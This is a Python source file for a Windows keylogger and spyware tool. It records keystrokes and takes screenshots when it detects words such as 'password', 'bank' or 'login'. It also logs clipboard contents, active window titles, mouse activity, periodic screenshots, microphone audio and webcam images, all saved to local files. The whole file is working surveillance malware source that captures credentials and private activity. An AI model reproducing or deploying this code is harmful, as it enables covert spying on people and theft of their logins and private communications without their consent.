import time
import threading
from pynput import keyboard, mouse
from PIL import ImageGrab
import win32gui
import pyperclip
import cv2
import sounddevice as sd
import os
import soundfile as sf

# Global Configuration
log_file = "keylog.txt"
screenshot_folder = "screenshots/"
audio_folder = "audio/"
alert_keywords = ["password", "bank", "login"]

# Function to write logs
def write_to_file(key_data, category="General"):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] [{category}] {key_data}\n")

# Keystroke Logging
def on_press(key):
    try:
        char = key.char
        write_to_file(f"Key: {char}", category="Keystroke")

        # Check for alert keywords
        for keyword in alert_keywords:
            if keyword in char:
                write_to_file(f"Alert: Detected keyword '{keyword}'", category="Alert")
                # Capture screenshot
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                screenshot_path = f"{screenshot_folder}alert_screenshot_{timestamp}.png"
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)
                break

    except AttributeError:
        write_to_file(f"Special Key: {key}", category="Keystroke")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Active Window Monitoring
def monitor_active_window():
    while True:
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if window_title:
            write_to_file(f"Active Window: {window_title}", category="Active Window")
        time.sleep(10)

# Clipboard Monitoring
def monitor_clipboard():
    recent_text = ""
    while True:
        try:
            clipboard_text = pyperclip.paste()
            if clipboard_text != recent_text:
                recent_text = clipboard_text
                write_to_file(f"Clipboard: {clipboard_text}", category="Clipboard")
        except Exception as e:
            write_to_file(f"Clipboard Error: {e}", category="Error")
        time.sleep(5)

# Screenshot Capture
def capture_screenshots():
    while True:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot = ImageGrab.grab()
        screenshot.save(f"{screenshot_folder}screenshot_{timestamp}.png")
        time.sleep(60)  # Take a screenshot every 60 seconds

# Mouse Monitoring
def on_move(x, y):
    active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    write_to_file(f"Mouse moved to ({x}, {y}) in window: {active_window}", category="Mouse")

def on_click(x, y, button, pressed):
    action = "Pressed" if pressed else "Released"
    write_to_file(f"Mouse {action} at ({x}, {y}) with {button}", category="Mouse")

def on_scroll(x, y, dx, dy):
    write_to_file(f"Mouse scrolled at ({x}, {y}) by ({dx}, {dy})", category="Mouse")

def monitor_mouse():
    with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
        listener.join()

# User Activity Analysis
def monitor_user_activity():
    last_activity_time = time.time()

    def update_activity():
        nonlocal last_activity_time
        last_activity_time = time.time()

    with keyboard.Listener(on_press=lambda _: update_activity()), mouse.Listener(on_click=lambda *args: update_activity()):
        while True:
            idle_time = time.time() - last_activity_time
            if idle_time > 10:  # User inactive for 10 seconds
                write_to_file(f"User inactive for {int(idle_time)} seconds", category="Activity")
            time.sleep(10)

# Microphone Recording
def record_audio():
    while True:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        audio_path = f"{audio_folder}audio_{timestamp}.wav"
        duration = 5  # Record for 5 seconds
        write_to_file("Recording audio snippet.", category="Audio")
        try:
            audio_data = sd.rec(int(duration * 44100), samplerate=44100, channels=2, dtype='int16')
            sd.wait()  # Wait until recording is finished
            sf.write(audio_path, audio_data, 44100)  # Properly save audio as WAV
        except Exception as e:
            write_to_file(f"Audio Recording Error: {e}", category="Error")
        time.sleep(60)  # Wait before recording the next snippet

# Webcam Snapshots
def capture_webcam():
    cam = cv2.VideoCapture(0)
    while True:
        ret, frame = cam.read()
        if ret:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            img_path = f"{screenshot_folder}webcam_{timestamp}.png"
            cv2.imwrite(img_path, frame)
            write_to_file("Captured webcam image.", category="Webcam")
        time.sleep(60)  # Capture webcam snapshot every 60 seconds
    cam.release()

def main():
    if not os.path.exists(screenshot_folder):
        os.makedirs(screenshot_folder)
    if not os.path.exists(audio_folder):
        os.makedirs(audio_folder)

    # Start threads for different monitoring tasks
    threading.Thread(target=monitor_active_window, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=capture_screenshots, daemon=True).start()
    threading.Thread(target=monitor_mouse, daemon=True).start()
    threading.Thread(target=monitor_user_activity, daemon=True).start()
    threading.Thread(target=record_audio, daemon=True).start()
    threading.Thread(target=capture_webcam, daemon=True).start()

    # Start keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("Keylogger is running... Press 'Esc' to stop.")
        listener.join()

if __name__ == "__main__":
    main()
